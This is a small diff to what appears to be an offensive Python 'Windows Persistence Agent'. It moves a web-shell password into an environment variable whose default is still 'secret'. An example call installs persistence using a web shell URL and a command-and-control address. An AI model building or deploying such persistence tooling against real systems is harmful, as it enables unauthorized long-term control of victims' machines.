@@ -3,10 +3,14 @@ Windows Persistence Agent
 ฝังตัวในระบบ Windows แบบถาวร
 """
 from core.logger import log
+import os
 
 import asyncio
 import base64
 from typing import Dict, List
+
+# Get default shell password from environment variable
+DEFAULT_SHELL_PASSWORD = os.getenv('SHELL_PASSWORD', 'secret')
 
 
 class WindowsPersistence:
@@ -389,7 +393,7 @@ if __name__ == "__main__":
         
         result = await persistence.install_all(
             shell_url="http://target.com/shell.aspx",
-            shell_password="secret",
+            shell_password=DEFAULT_SHELL_PASSWORD,
             c2_url="192.168.1.100:4444"
         )
         
